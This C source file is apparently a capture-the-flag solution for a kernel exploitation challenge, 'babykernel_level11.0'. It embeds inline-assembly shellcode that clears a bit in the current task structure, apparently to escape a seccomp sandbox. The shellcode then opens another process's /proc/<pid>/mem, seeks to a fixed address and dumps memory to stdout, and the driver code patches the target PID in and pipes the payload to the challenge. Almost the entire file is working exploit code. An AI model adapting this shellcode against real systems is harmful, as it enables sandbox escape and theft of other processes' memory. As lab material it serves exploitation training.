#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

__attribute__((naked)) void shellcode() { 
   __asm__(
       ".intel_syntax noprefix;"
       "sc_start:;"
       ".global _kernel_sc;"
       ".global _userland_sc;"
       "call _userland_sc;"

       "_kernel_sc:;"
       "mov rax, [gs:0x15d00];"
       "and qword ptr [rax], 0xfffffffffffffeff;"
       "xor rax, rax;"
       "ret;"

       "_userland_sc:;"
       "xor rax, rax;"
       "xor rdi, rdi;"
       "xor rsi, rsi;"
       "xor rdx, rdx;"

       "mov rdi, 3;"
       "pop rsi;"
       "mov rdx, _userland_sc - _kernel_sc;"
       "mov al, 1;"
       "syscall;"

       "mov rbx, 0x6d656d2f414141;"
       "push rbx;"
       "mov rbx, 0x2f636f72702f2f2f;"
       "push rbx;"
       "push rsp;"
       "pop rdi;"
       "xor rsi, rsi;"
       "xor rdx, rdx;"
       "mov rax, 2;"
       "syscall;"

       "mov rdi, rax;"
       "mov rsi, 0x404040;"
       "mov rdx, 0;"
       "mov rax, 8;"
       "syscall;"

       "lea rsi, [rsp+0x200];"
       "mov rdx, 0x100;"
       "xor rax, rax;"
       "syscall;"

       "mov rdi, 1;"
       "lea rsi, [rsp+0x200];"
       "mov rdx, 0x100;"
       "mov rax, 1;"
       "syscall;"

       "mov rax, 60;"
       "xor rdi, rdi;"
       "syscall;"

       "sc_end:;"
       ".att_syntax;"
       );
}

int main() {
  FILE *pipe, *cmd_pipe;
  char pid_buf[3];
  unsigned int child_pid;
  extern char sc_start[], sc_end[];

  printf("[+] Executing /challenge/babykernel_level11.0...\n");
  if ((pipe = popen("/challenge/babykernel_level11.0", "w")) == NULL) { 
    perror("popen");
    exit(1);
  }

  sleep(2);

  printf("[+] Executing pgrep in order to find the child PID...\n");
  if ((cmd_pipe = popen("pgrep -n babykernel", "r")) == NULL) { 
    perror("popen");
    exit(1);
  }

  fread(pid_buf, 3, 1, cmd_pipe);
  child_pid = atoi(pid_buf);
  printf("[+] Child PID: %u\n", child_pid);

  // shellcode stuff
  size_t sc_size = sc_end -sc_start;
  unsigned char sc[sc_size];
  memcpy(sc, sc_start, sc_size);
  unsigned char *pid_ptr = memmem(sc, sc_size, "AAA", 3);
  memcpy(pid_ptr, pid_buf, 3);

  printf("[+] Shellcode size: %zu bytes\n[+] Executing shellcode...\n", sc_size);
  write(1, sc, sc_size);

  fwrite(sc, sc_end - sc_start, 1, pipe);
  pclose(pipe);

  return 0;
}
